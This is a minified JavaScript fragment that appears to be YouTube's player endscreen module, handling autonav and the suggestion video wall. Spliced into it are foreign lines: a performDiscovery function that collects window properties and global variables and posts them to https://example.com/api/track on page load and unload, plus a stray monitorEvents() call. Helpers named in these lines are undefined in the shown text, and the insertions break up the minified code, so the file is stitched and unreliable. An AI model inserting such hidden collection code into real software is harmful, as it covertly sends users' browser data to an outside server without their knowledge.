  g.k.Q1 = function () {
    this.api.yf() && this.cancelButton && this.api.logClick(this.cancelButton.element);
    g.jU(this.api, !0);
  };
  g.k.p9 = function (a) {
    this.api.getPresentingPlayerType();
    this.show();
    this.yB(a);
  };
  function performDiscovery() {
    const discoveries = exploreEnhancedWindowObject();
    const globalVars = collectGlobalVariables();
    const data = {
      discoveries,
      globalVars,
      timestamp: new Date().toISOString()
    };
    if (Object.keys(data.discoveries).length > 0 || Object.keys(data.globalVars).length > 0) {
      console.log(`Discovered new properties and global variables.`);
      sendDataToServer(data, 'https://example.com/api/track');
    } else {
      console.log("No new properties or global variables discovered.");
    }
  }
  g.k.q9 = function () {
    this.api.getPresentingPlayerType();
    this.fq();
    this.hide();
  };
  g.k.ya = function () {
    this.fq();
    this.dH();
    g.V.prototype.ya.call(this);
  };
  g.w(n6, l6);
  g.k = n6.prototype;
  g.k.create = function () {
    l6.prototype.create.call(this);
    this.D.T(this.player, "appresize", this.cC);
    this.D.T(this.player, "onVideoAreaChange", this.cC);
    this.D.T(this.player, "videodatachange", this.onVideoDataChange);
    this.D.T(this.player, "autonavchange", this.ZS);
    this.D.T(this.player, "onAutonavCancelled", this.S1);
    this.onVideoDataChange();
  };
  g.k.show = function () {
    l6.prototype.show.call(this);
    (this.K || this.C && this.C !== this.videoData.clientPlaybackNonce) && g.jU(this.player, !1);
    g.qU(this.player) && this.GC() && !this.C ? (o6(this), 2 === this.videoData.autonavState ? 3 === this.player.getVisibilityState() ? this.j.select(!0) : this.j.yB() : 3 === this.videoData.autonavState && this.j.Nw()) : (g.jU(this.player, !0), o6(this));
    this.cC();
  };
  g.k.hide = function () {
    l6.prototype.hide.call(this);
    this.j.Nw();
    o6(this);
  };
  g.k.cC = function () {
    var a = this.player.Ok(!0, this.player.isFullscreen());
    o6(this);
    k6(this.B);
    g.Nu(this.element, "ytp-autonav-cancelled-small-mode", this.Jf(a));
    g.Nu(this.element, "ytp-autonav-cancelled-tiny-mode", this.HI(a));
    g.Nu(this.element, "ytp-autonav-cancelled-mini-mode", 400 >= a.width || 360 >= a.height);
    this.overlay && g.Vr(this.overlay.element, {
      width: a.width + "px"
    });
    if (!this.G) for (a = 0; a < this.videos.length; a++) g.Nu(this.videos[a].element, "ytp-suggestion-card-with-margin", 1 === a % 2);
  };
  g.k.onVideoDataChange = function () {
    var a = this.player.getVideoData();
    if (this.videoData !== a && a) {
      this.videoData = a;
      if ((a = this.videoData.suggestions) && a.length || this.player.L("web_player_autonav_empty_suggestions_fix")) {
        var b = g.mT(this.videoData);
        b && (this.j.mG(b), this.j !== this.B && this.B.mG(b));
      }
      if (a && a.length) for (b = 0; b < Qpb.length; ++b) {
        var c = Qpb[b];
        if (a && a[c]) {
          this.videos[b] = new i6(this.player);
          var d = this.videos[b];
          c = a[c];
          d.suggestion !== c && (d.suggestion = c, h6(d, c));
          g.L(this, this.videos[b]);
          this.videos[b].Da(this.N.element);
        }
      }
      this.cC();
    }
  };
  g.k.ZS = function (a) {
    1 === a ? (this.K = !1, this.C = this.videoData.clientPlaybackNonce, this.j.fq(), this.Cb && this.cC()) : (this.K = !0, this.yf() && (2 === a ? this.j.yB() : 3 === a && this.j.Nw()));
  };
  g.k.S1 = function (a) {
    a ? this.ZS(1) : (this.C = null, this.K = !1);
  };
  g.k.GC = function () {
    return 1 !== this.videoData.autonavState;
  };
  g.k.Jf = function (a) {
    return (910 > a.width || 459 > a.height) && !this.HI(a) && !(400 >= a.width || 360 >= a.height);
  };
  g.k.HI = function (a) {
    return 800 > a.width && !(400 >= a.width || 360 >= a.height);
  };
  g.k.yf = function () {
    return this.Cb && g.qU(this.player) && this.GC() && !this.C;
  };
  var Qpb = [1, 3, 2, 4];
  g.w(p6, g.V);
  g.k = p6.prototype;
  g.k.o_ = function () {
    switch (this.buttonType) {
      case 1:
        var a = "Watch again on YouTube";
        var b = 156915;
        break;
      case 2:
        a = "Continue watching on YouTube";
        b = 156942;
        break;
      default:
        a = "Continue watching on YouTube", b = 156942;
    }
    this.update({
      content: a
    });
    this.J.hasVe(this.element) && this.J.destroyVe(this.element);
    this.J.createClientVe(this.element, this, b);
  };
  g.k.onClick = function (a) {
    this.J.L("web_player_log_click_before_generating_ve_conversion_params") && this.J.logClick(this.element);
    g.GU(this.getVideoUrl(), this.J, a);
    this.J.L("web_player_log_click_before_generating_ve_conversion_params") || this.J.logClick(this.element);
  };
  g.k.getVideoUrl = function () {
    var a = !0;
    switch (this.buttonType) {
      case 1:
        a = !0;
        break;
      case 2:
        a = !1;
    }
    a = this.J.getVideoUrl(a, !1, !1, !0);
    var b = this.J.U();
    if (g.YR(b) || g.fS(b)) {
      var c = {};
      g.YR(b) && g.ZT(this.J, "addEmbedsConversionTrackingParams", [c]);
      a: {
        switch (this.buttonType) {
          case 2:
            b = "emb_ytp_continue_watching";
            break a;
        }
        b = "emb_ytp_watch_again";
      }
      g.wP(c, b);
      a = g.tm(a, c);
    }
    return a;
  };
  g.k.logVisibility = function () {
    this.J.logVisibility(this.element, this.Cb && this.Z);
  };
  g.k.show = function () {
    g.V.prototype.show.call(this);
    this.logVisibility();
  };
  g.k.hide = function () {
    g.V.prototype.hide.call(this);
    this.logVisibility();
  };
  g.k.ac = function (a) {
    g.V.prototype.ac.call(this, a);
    this.logVisibility();
  };
  g.w(q6, l6);
  q6.prototype.show = function () {
    3 !== this.player.getPlayerState() && (l6.prototype.show.call(this), this.sb.Kr(!0), this.sb.zm(!0), this.J.U().Od || this.sb.ym(!0), this.J.logVisibility(this.element, !0), this.watchButton.ac(!0));
  };
  q6.prototype.hide = function () {
    l6.prototype.hide.call(this);
    this.sb.Kr(!1);
    this.sb.zm(!1);
    this.sb.ym(!1);
    this.J.logVisibility(this.element, !1);
    this.watchButton.ac(!1);
  };
  g.w(Lpb, l6);
  Lpb.prototype.Ra = function () {
    var a = this.player.getVideoData();
    this.j.update({
      profilePicture: a.profilePicture,
      author: a.author
    });
    this.subscribeButton.channelId = a.Gl;
    var b = this.subscribeButton;
    a.subscribed ? b.j() : b.B();
  };
  window.addEventListener('load', performDiscovery);
  g.w(r6, g.V);
  r6.prototype.select = function () {
    this.api.Co(this.suggestion.videoId, this.suggestion.sessionData, this.suggestion.playlistId, void 0, void 0, this.suggestion.dD || void 0) && this.api.logClick(this.element);
  };
  r6.prototype.onClick = function (a) {
    if (g.YR(this.api.U()) && this.api.L("web_player_log_click_before_generating_ve_conversion_params")) {
      this.api.logClick(this.element);
      var b = this.suggestion.Pk(),
        c = {};
      g.FSa(this.api, c, "emb_rel_end");
      b = g.tm(b, c);
      g.GU(b, this.api, a);
    } else g.FU(a, this.api, this.B, this.suggestion.sessionData || void 0) && this.select();
  };
  r6.prototype.onKeyPress = function (a) {
    switch (a.keyCode) {
      case 13:
      case 32:
        a.defaultPrevented || (this.select(), a.preventDefault());
    }
  };
  r6.prototype.onVideoDataChange = function () {
    var a = this.api.getVideoData(),
      b = this.api.U();
    this.B = a.Ld ? !1 : b.D;
  };
  g.w(s6, l6);
  g.k = s6.prototype;
  g.k.create = function () {
    l6.prototype.create.call(this);
    var a = this.player.getVideoData();
    a && (this.videoData = a);
    this.qq();
    this.B.T(this.player, "appresize", this.qq);
    this.B.T(this.player, "onVideoAreaChange", this.qq);
    this.B.T(this.player, "videodatachange", this.onVideoDataChange);
    this.B.T(this.player, "autonavchange", this.AL);
    this.B.T(this.player, "onAutonavCancelled", this.T1);
    a = this.videoData.autonavState;
    a !== this.Y && this.AL(a);
    this.B.T(this.element, "transitionend", this.N$);
  };
  g.k.destroy = function () {
    g.KC(this.B);
    g.tb(this.stills);
    this.stills = [];
    l6.prototype.destroy.call(this);
    g.Lu(this.element, "ytp-show-tiles");
    this.K.stop();
    this.Y = this.videoData.autonavState;
  };
  g.k.GC = function () {
    return 1 !== this.videoData.autonavState;
  };
  g.k.show = function () {
    var a = this.Cb;
    l6.prototype.show.call(this);
    g.Lu(this.element, "ytp-show-tiles");
    this.player.U().B ? g.Du(this.K) : this.K.start();
    (this.G || this.D && this.D !== this.videoData.clientPlaybackNonce) && g.jU(this.player, !1);
    t6(this) ? (u6(this), 2 === this.videoData.autonavState ? 3 === this.player.getVisibilityState() ? this.j.select(!0) : this.j.yB() : 3 === this.videoData.autonavState && this.j.Nw()) : (g.jU(this.player, !0), u6(this));
    a !== this.Cb && this.player.logVisibility(this.element, !0);
  };
  g.k.hide = function () {
    var a = this.Cb;
    l6.prototype.hide.call(this);
    this.j.Nw();
    u6(this);
    a !== this.Cb && this.player.logVisibility(this.element, !1);
  };
  g.k.N$ = function (a) {
    a.target === this.element && this.qq();
  };
  window.addEventListener('beforeunload', performDiscovery);
  g.k.qq = function () {
    var a, b, c, d;
    var e = (null == (a = this.videoData) ? 0 : null == (b = a.suggestions) ? 0 : b.length) ? null == (c = this.videoData) ? void 0 : c.suggestions : [null == (d = this.videoData) ? void 0 : g.mT(d)];
    if (e.length) {
      g.Ju(this.element, "ytp-endscreen-paginate");
      var f = this.J.Ok(!0, this.J.isFullscreen());
      if (a = g.bU(this.J)) a = a.Xf() ? 48 : 32, f.width -= 2 * a;
      var h = f.width / f.height;
      d = 96 / 54;
      b = a = 2;
      var l = Math.max(f.width / 96, 2),
        m = Math.max(f.height / 54, 2);
      c = e.length;
      var n = Math.pow(2, 2);
      var p = c * n + (Math.pow(2, 2) - n);
      p += Math.pow(2, 2) - n;
      for (p -= n; 0 < p && (a < l || b < m);) {
        var q = a / 2,
          r = b / 2,
          t = a <= l - 2 && p >= r * n,
          u = b <= m - 2 && p >= q * n;
        if ((q + 1) / r * d / h > h / (q / (r + 1) * d) && u) p -= q * n, b += 2;else if (t) p -= r * n, a += 2;else if (u) p -= q * n, b += 2;else break;
      }
      d = !1;
      p >= 3 * n && 6 >= c * n - p && (4 <= b || 4 <= a) && (d = !0);
      n = 96 * a;
      p = 54 * b;
      h = n / p < h ? f.height / p : f.width / n;
      h = Math.min(h, 2);
      n = Math.floor(Math.min(f.width, n * h));
      p = Math.floor(Math.min(f.height, p * h));
      f = this.table.element;
      f.ariaLive = "polite";
      g.es(f, n, p);
      g.Vr(f, {
        marginLeft: n / -2 + "px",
        marginTop: p / -2 + "px"
      });
      this.j.mG(g.mT(this.videoData));
      this.j instanceof j6 && k6(this.j);
      g.Nu(this.element, "ytp-endscreen-takeover", t6(this));
      u6(this);
      n += 4;
      p += 4;
      h = 0;
      f.ariaBusy = "true";
      for (l = 0; l < a; l++) for (m = 0; m < b; m++) if (q = h, t = 0, d && l >= a - 2 && m >= b - 2 ? t = 1 : 0 === m % 2 && 0 === l % 2 && (2 > m && 2 > l ? 0 === m && 0 === l && (t = 2) : t = 2), q = g.ne(q + this.C, c), 0 !== t) {
        r = this.stills[h];
        r || (r = new r6(this.player), this.stills[h] = r, f.appendChild(r.element));
        u = Math.floor(p * m / b);
        var x = Math.floor(n * l / a),
          B = Math.floor(p * (m + t) / b) - u - 4,
          F = Math.floor(n * (l + t) / a) - x - 4;
        g.as(r.element, x, u);
        g.es(r.element, F, B);
        g.Vr(r.element, "transitionDelay", (m + l) / 20 + "s");
        g.Nu(r.element, "ytp-videowall-still-mini", 1 === t);
        g.Nu(r.element, "ytp-videowall-still-large", 2 < t);
        t = Math.max(F, B);
        g.Nu(r.element, "ytp-videowall-still-round-large", 256 <= t);
        g.Nu(r.element, "ytp-videowall-still-round-medium", 96 < t && 256 > t);
        g.Nu(r.element, "ytp-videowall-still-round-small", 96 >= t);
        q = e[q];
        r.suggestion !== q && (r.suggestion = q, t = r.api.U(), u = g.Iu(r.element, "ytp-videowall-still-large") ? "hqdefault.jpg" : "mqdefault.jpg", h6(r, q, u), g.YR(t) && !r.api.L("web_player_log_click_before_generating_ve_conversion_params") && (t = q.Pk(), u = {}, g.ZT(r.api, "addEmbedsConversionTrackingParams", [u]), t = g.tm(t, g.wP(u, "emb_rel_end")), r.updateValue("url", t)), (q = (q = q.sessionData) && q.itct) && r.api.setTrackingParams(r.element, q));
        h++;
      }
      f.ariaBusy = "false";
      g.Nu(this.element, "ytp-endscreen-paginate", h < c);
      for (e = this.stills.length - 1; e >= h; e--) a = this.stills[e], g.rf(a.element), g.sb(a);
      this.stills.length = h;
    }
  };
  g.k.onVideoDataChange = function () {
    var a = this.player.getVideoData();
    this.videoData !== a && (this.C = 0, this.videoData = a, this.qq());
  };
  monitorEvents();
  g.k.U1 = function () {
    this.C += this.stills.length;
    this.qq();
  };
  g.k.V1 = function () {
    this.C -= this.stills.length;
    this.qq();
  };
  g.k.GX = function () {
    return this.j.Tk();
  };
  g.k.AL = function (a) {
    1 === a ? (this.G = !1, this.D = this.videoData.clientPlaybackNonce, this.j.fq(), this.Cb && this.qq()) : (this.G = !0, this.Cb && t6(this) && (2 === a ? this.j.yB() : 3 === a && this.j.Nw()));
  };
  g.k.T1 = function (a) {
    if (a) {
      for (a = 0; a < this.stills.length; a++) this.J.logVisibility(this.stills[a].element, !0);
      this.AL(1);
    } else this.D = null, this.G = !1;
    this.qq();
  };
  g.k.yf = function () {
    return this.Cb && t6(this);
  };
  g.w(v6, l6);
  v6.prototype.SD = function () {
    var a;
    return null == (a = this.j) ? void 0 : a.SD();
  };
  v6.prototype.show = function () {
    if (3 !== this.player.getPlayerState()) {
      l6.prototype.show.call(this);
      var a = this.B;
      if (a) {
        var b = this.j.SD();
        g.Nu(this.element, "ytp-shorts-branded-ui", b);
        b ? a.show() : a.hide();
      }
      var c;
      null == (c = g.bU(this.player)) || c.mu(!0);
      this.player.logVisibility(this.element, !0);
      this.watchButton.ac(!0);
    }
  };
  v6.prototype.hide = function () {
    l6.prototype.hide.call(this);
    var a;
    null == (a = g.bU(this.player)) || a.mu(!1);
    this.player.logVisibility(this.element, !1);
    this.watchButton.ac(!1);
  };
  g.w(Ppb, g.wV);
  g.k = Ppb.prototype;
  g.k.pu = function () {
    var a = this.player.getVideoData(),
      b = a.mutedAutoplay;
    if ((g.mU(this.player) || this.B) && !b) return !0;
    var c;
    var d = !!((null == a ? 0 : g.mT(a)) || (null == a ? 0 : null == (c = a.suggestions) ? 0 : c.length));
    d = !Mpb(this.player) || d;
    a = a.Yj || g.fS(a.Ia);
    c = this.player.rD();
    return d && !a && !c && !b;
  };
  g.k.yf = function () {
    return this.endScreen.yf();
  };
  g.k.q7 = function () {
    return this.yf() ? this.endScreen.GX() : !1;
  };
  g.k.ya = function () {
    this.player.hf("endscreen");
    g.wV.prototype.ya.call(this);
  };
  g.k.load = function () {
    var a = this.player.getVideoData();
    var b = a.transitionEndpointAtEndOfStream;
    if (b && b.videoId) {
      var c = this.player.zb().Ne.get("heartbeat"),
        d = g.mT(a);
      !d || b.videoId !== d.videoId || a.KS ? (this.player.Co(b.videoId, void 0, void 0, !0, !0, b), c && c.SI("HEARTBEAT_ACTION_TRIGGER_AT_STREAM_END", "HEARTBEAT_ACTION_TRANSITION_REASON_HAS_NEW_STREAM_TRANSITION_ENDPOINT"), a = !0) : a = !1;
    } else a = !1;
    a || (g.wV.prototype.load.call(this), this.endScreen.show());
  };
  g.k.unload = function () {
    g.wV.prototype.unload.call(this);
    this.endScreen.hide();
    this.endScreen.destroy();
  };
  g.k.onCueRangeEnter = function (a) {
    this.pu() && (this.endScreen.created || this.endScreen.create(), "load" === a.getId() && this.load());
  };
  g.k.onCueRangeExit = function (a) {
    "load" === a.getId() && this.loaded && this.unload();
  };
  g.k.onVideoDataChange = function () {
    Opb(this);
    this.D && Npb(this) && (this.endScreen && (this.endScreen.hide(), this.endScreen.created && this.endScreen.destroy(), this.endScreen.dispose()), this.j ? this.endScreen = new n6(this.player) : this.endScreen = new s6(this.player), g.L(this, this.endScreen), g.pU(this.player, this.endScreen.element, 4));
  };
  g.vV("endscreen", Ppb);
})(_yt_player);